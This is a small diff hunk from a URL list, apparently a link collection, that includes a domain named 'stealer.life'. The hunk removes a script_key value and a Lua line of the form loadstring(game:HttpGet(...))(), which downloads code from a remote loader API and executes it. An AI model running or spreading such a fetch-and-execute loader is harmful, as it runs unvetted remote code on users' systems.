@@ -32,7 +32,3 @@ https://chiikawa.stealer.life/
 https://github.com/RiptideMC/HORIZON
 https://melee.hexdump0.pw/play
  spanish-class.scottbaptist.com
-
-script_key = "be60b7a0ce63a88112900422d5d155b9"
-
-loadstring(game:HttpGet("https://api.polsec.sh/loader/8c6c8fec9e1dd3e5/c46b22ec38efdcd2"))()
